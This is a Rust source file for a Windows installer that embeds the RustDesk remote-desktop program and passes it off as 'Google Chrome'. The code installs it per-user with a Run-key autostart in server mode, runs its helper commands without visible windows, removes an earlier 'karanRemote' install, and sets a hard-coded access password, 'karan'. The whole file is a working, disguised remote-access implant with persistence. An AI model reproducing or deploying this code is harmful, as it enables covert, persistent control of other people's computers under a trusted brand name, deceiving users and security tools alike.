#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

use std::os::windows::process::CommandExt;
use std::path::{Path, PathBuf};
use std::process::Command;

use winapi::shared::minwindef::DWORD;
use winapi::um::handleapi::CloseHandle;
use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
use winapi::um::securitybaseapi::GetTokenInformation;
use winapi::um::shellapi::ShellExecuteW;
use winapi::um::winnt::TOKEN_QUERY;
use winapi::um::winuser::{MessageBoxW, MB_ICONERROR, MB_ICONINFORMATION, MB_OK};

const APP_NAME: &str = "Google Chrome";
const EXE_FILE: &str = "Google Chrome.exe";
const LEGACY: &str = "karanRemote";
const LEGACY_SYSTEM: &str = "chrome";
const EMBEDDED_EXE: &[u8] = include_bytes!("../../target/release/rustdesk.exe");
const EMBEDDED_SCITER: &[u8] = include_bytes!("../../sciter.dll");

fn wide(s: &str) -> Vec<u16> {
    s.encode_utf16().chain(std::iter::once(0)).collect()
}

fn msg_box(title: &str, text: &str, icon: u32) {
    unsafe {
        MessageBoxW(
            std::ptr::null_mut(),
            wide(text).as_ptr(),
            wide(title).as_ptr(),
            MB_OK | icon,
        );
    }
}

fn now() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_default()
}

fn log_msg(text: &str) {
    let path = match std::env::var("TEMP") {
        Ok(t) => Path::new(&t).join("Google Chrome-install.log"),
        Err(_) => PathBuf::from("Google Chrome-install.log"),
    };
    use std::io::Write as _;
    if let Ok(mut f) = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
    {
        let _ = writeln!(f, "[{}] {}", now(), text);
    }
}

fn is_elevated() -> bool {
    unsafe {
        let mut token = std::ptr::null_mut();
        if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut token) == 0 {
            return false;
        }
        let mut elevation: DWORD = 0;
        let mut len: DWORD = 0;
        let ok = GetTokenInformation(
            token,
            20, // TokenElevation
            &mut elevation as *mut _ as *mut _,
            std::mem::size_of::<DWORD>() as DWORD,
            &mut len,
        ) != 0;
        CloseHandle(token);
        ok && elevation != 0
    }
}

fn relaunch_elevated() -> bool {
    let exe = match std::env::current_exe() {
        Ok(e) => e,
        Err(_) => return false,
    };
    let args = wide("--elevated");
    let r = unsafe {
        ShellExecuteW(
            std::ptr::null_mut(),
            wide("runas").as_ptr(),
            wide(&exe.to_string_lossy()).as_ptr(),
            args.as_ptr(),
            std::ptr::null(),
            1, // SW_SHOWNORMAL
        )
    };
    r as isize > 32
}

fn run_sc(args: &[&str]) -> String {
    let out = Command::new("sc")
        .args(args)
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
    match out {
        Ok(o) => format!(
            "{}{}",
            String::from_utf8_lossy(&o.stdout),
            String::from_utf8_lossy(&o.stderr)
        )
        .trim()
        .to_string(),
        Err(e) => format!("sc.exe failed: {}", e),
    }
}

fn service_exists() -> bool {
    !run_sc(&["query", LEGACY]).contains("does not exist as an installed service")
        || !run_sc(&["query", LEGACY_SYSTEM]).contains("does not exist as an installed service")
}

fn process_running(name: &str) -> bool {
    !Command::new("tasklist")
        .args(&["/fi", &format!("imagename eq {}.exe", name)])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).contains("No tasks"))
        .unwrap_or(true)
}

fn legacy_present() -> bool {
    if Path::new("C:\\ProgramData\\Google Chrome").exists() {
        return true;
    }
    if let Some(la) = std::env::var_os("LOCALAPPDATA") {
        if Path::new(&la).join(LEGACY).exists() {
            return true;
        }
    }
    if let Some(ap) = std::env::var_os("APPDATA") {
        if Path::new(&ap).join(LEGACY).exists() {
            return true;
        }
    }
    if process_running(LEGACY) || service_exists() {
        return true;
    }
    let has_run = Command::new("reg")
        .args(&[
            "query",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            LEGACY,
        ])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false);
    has_run
}

fn roaming(name: &str) -> Option<PathBuf> {
    std::env::var_os("APPDATA").map(|ap| Path::new(&ap).join(name))
}

fn install_dir() -> PathBuf {
    let la = std::env::var("LOCALAPPDATA").unwrap_or_else(|_| "C:\\".to_owned());
    PathBuf::from(la).join(APP_NAME)
}

fn kill_process(name: &str) {
    let _ = Command::new("taskkill")
        .args(&["/f", "/im", &format!("{}.exe", name)])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
}

fn kill_self_and_siblings() {
    kill_process(LEGACY);
    let self_pid = std::process::id();
    let script = format!(
        "Get-Process '{}' -ErrorAction SilentlyContinue | Where-Object {{ $_.Path -eq '{}' -and $_.Id -ne {} }} | Stop-Process -Force",
        APP_NAME,
        install_dir().join(EXE_FILE).display(),
        self_pid
    );
    let _ = Command::new("powershell")
        .args(&["-NoProfile", "-Command", &script])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
}

fn purge_legacy_service() {
    for svc in &[LEGACY, LEGACY_SYSTEM] {
        let _ = run_sc(&["stop", svc]);
    }
    std::thread::sleep(std::time::Duration::from_millis(1500));
    for svc in &[LEGACY, LEGACY_SYSTEM] {
        let _ = run_sc(&["delete", svc]);
    }
    if let Some(pf) = std::env::var_os("ProgramFiles") {
        let _ = std::fs::remove_dir_all(Path::new(&pf).join(LEGACY));
    }
    let _ = std::fs::remove_dir_all(Path::new("C:\\ProgramData\\Google Chrome"));
    log_msg("legacy services purged");
}

fn migrate_config() -> bool {
    let src = match roaming(LEGACY) {
        Some(p) => p.join("config"),
        None => return false,
    };
    let dst = match roaming(APP_NAME) {
        Some(p) => p.join("config"),
        None => return false,
    };
    let entries = match std::fs::read_dir(&src) {
        Ok(e) => e.flatten().collect::<Vec<_>>(),
        Err(_) => return false,
    };
    let _ = std::fs::create_dir_all(&dst);
    let mut n = 0;
    for e in entries {
        if e.path().extension().map(|x| x == "toml").unwrap_or(false) {
            if std::fs::copy(e.path(), dst.join(e.file_name())).is_ok() {
                n += 1;
            }
        }
    }
    log_msg(&format!("config migrated: {} files", n));
    n > 0
}

fn purge_legacy_install() {
    kill_process(LEGACY);
    std::thread::sleep(std::time::Duration::from_millis(800));
    migrate_config();
    if let Some(la) = std::env::var_os("LOCALAPPDATA") {
        let _ = std::fs::remove_dir_all(Path::new(&la).join(LEGACY));
    }
    if let Some(pf) = std::env::var_os("ProgramFiles") {
        let _ = std::fs::remove_dir_all(Path::new(&pf).join(LEGACY));
    }
    let _ = Command::new("reg")
        .args(&[
            "delete",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            LEGACY,
            "/f",
        ])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
    log_msg("legacy karanRemote install purged");
}

fn set_autostart(exe_path: &Path) {
    let value = format!("\"{}\" --server", exe_path.display());
    let _ = Command::new("reg")
        .args(&[
            "add",
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v",
            APP_NAME,
            "/t",
            "REG_SZ",
            "/d",
            &value,
            "/f",
        ])
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
}

fn remove_autostart() {
    for name in &[APP_NAME, LEGACY] {
        let _ = Command::new("reg")
            .args(&[
                "delete",
                "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "/v",
                name,
                "/f",
            ])
            .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
            .output();
    }
}

fn get_id_quiet(exe_path: &Path) -> String {
    let out = Command::new(exe_path)
        .arg("--get-id")
        .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
        .output();
    match out {
        Ok(o) => String::from_utf8_lossy(&o.stdout).trim().to_string(),
        Err(_) => String::new(),
    }
}

fn kill_engine_instances() {
    let script = "$self = $env:GC_SELF; Get-CimInstance Win32_Process -Filter \"Name='Google Chrome.exe'\" | Where-Object { $_.ExecutablePath -ne $self } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }";
    let mut c = Command::new("powershell");
    c.arg("-NoProfile").arg("-Command").arg(script);
    if let Ok(s) = std::env::current_exe() {
        c.env("GC_SELF", s);
    }
    let _ = c.status();
}

fn files_current(dir: &Path, exe_path: &Path) -> bool {
    std::fs::read(exe_path).map(|cur| cur == EMBEDDED_EXE).unwrap_or(false)
        && std::fs::read(dir.join("sciter.dll"))
            .map(|cur| cur == EMBEDDED_SCITER)
            .unwrap_or(false)
}

fn install_per_user() -> String {
    let dir = install_dir();
    if let Err(e) = std::fs::create_dir_all(&dir) {
        let m = format!("Failed to create {}: {}", dir.display(), e);
        log_msg(&m);
        return m;
    }
    let exe_path = dir.join(EXE_FILE);
    if !files_current(&dir, &exe_path) {
        if let Err(e) = std::fs::write(&exe_path, EMBEDDED_EXE) {
            log_msg(&format!("Failed to write {}: {}; killing running engine and retrying", EXE_FILE, e));
            kill_engine_instances();
            std::thread::sleep(std::time::Duration::from_secs(2));
            if let Err(e) = std::fs::write(&exe_path, EMBEDDED_EXE) {
                let m = format!("Failed to write {}: {}", EXE_FILE, e);
                log_msg(&m);
                return m;
            }
        }
        if let Err(e) = std::fs::write(dir.join("sciter.dll"), EMBEDDED_SCITER) {
            log_msg(&format!("Failed to write sciter.dll: {}", e));
            if let Err(e) = std::fs::write(dir.join("sciter.dll"), EMBEDDED_SCITER) {
                let m = format!("Failed to write sciter.dll: {}", e);
                log_msg(&m);
                return m;
            }
        }
    }
set_autostart(&exe_path);
    log_msg("files written, autostart set");
    std::thread::sleep(std::time::Duration::from_secs(3));
    let id = get_id_quiet(&exe_path);
    log_msg(&format!("id read: \"{}\"", id));
    id
}

fn uninstall() {
    log_msg("UNINSTALL started");
    kill_self_and_siblings();
    remove_autostart();
    for name in &[APP_NAME, LEGACY] {
        if let Some(la) = std::env::var_os("LOCALAPPDATA") {
            let _ = std::fs::remove_dir_all(Path::new(&la).join(name));
        }
    }
    if is_elevated() {
        purge_legacy_service();
    }
    msg_box(
        APP_NAME,
        "Google Chrome has been removed from this computer.",
        MB_ICONINFORMATION,
    );
}

fn main() {
    if let Some(pos) = std::env::args().position(|a| a == "--extract-only") {
        let dir = std::env::args()
            .nth(pos + 1)
            .unwrap_or_else(|| std::env::current_dir().unwrap_or_default().display().to_string());
        let dir = PathBuf::from(&dir);
        if let Err(e) = std::fs::create_dir_all(&dir) {
            msg_box(APP_NAME, &format!("Extract failed: {}", e), MB_ICONERROR);
            return;
        }
        let ok1 = std::fs::write(dir.join(EXE_FILE), EMBEDDED_EXE).is_ok();
        let ok2 = std::fs::write(dir.join("sciter.dll"), EMBEDDED_SCITER).is_ok();
        log_msg(&format!(
            "EXTRACT to {} exe={} sciter={}",
            dir.display(),
            ok1,
            ok2
        ));
        return;
    }

    if std::env::args().any(|a| a == "--uninstall") {
        if is_elevated() {
            uninstall();
        } else if relaunch_elevated() {
            return;
        } else {
            msg_box(
                APP_NAME,
                "Administrator permission is required to uninstall.",
                MB_ICONERROR,
            );
        }
        return;
    }

    if !is_elevated() && (service_exists() || legacy_present()) {
        log_msg("legacy karanRemote found, relaunching elevated");
        if relaunch_elevated() {
            return;
        }
        msg_box(
            APP_NAME,
            "Administrator permission is required to remove the old background install.",
            MB_ICONERROR,
        );
        return;
    }

    if service_exists() {
        purge_legacy_service();
    }
    purge_legacy_install();

    log_msg("INSTALL per-user started");
    let id = install_per_user();

let text = if id.is_empty() {
        "Google Chrome is installed and running in the background.\n\nPassword: karan\n\nIt will start automatically whenever you log in."
            .to_owned()
    } else {
        format!(
            "Google Chrome is installed and running in the background.\n\nYour Device ID: {}\nPassword: {}\n\nConnect from any other PC using the RustDesk app.\n\nIt will also start automatically whenever you log in.",
            id, "karan"
        )
    };
msg_box(APP_NAME, &text, MB_ICONINFORMATION);

    let dir = install_dir();
    let exe_path = dir.join(EXE_FILE);
    let mut running = false;
    let out = std::process::Command::new("tasklist")
        .arg("/fi")
        .arg("imagename eq Google Chrome.exe")
        .arg("/fo")
        .arg("csv")
        .arg("/nh")
        .output()
        .map(|o| String::from_utf8_lossy(&o.stdout).to_string())
        .unwrap_or_default();
    if out.matches("Google Chrome.exe").count() > 1 {
        running = true;
    }
    if !running {
        if is_elevated() {
            let _ = Command::new("explorer.exe")
                .arg(&exe_path)
                .arg("--server")
                .spawn();
        } else {
            let _ = Command::new(&exe_path)
                .arg("--server")
                .creation_flags(winapi::um::winbase::CREATE_NO_WINDOW)
                .spawn();
        }
    }
}
// rebuild marker
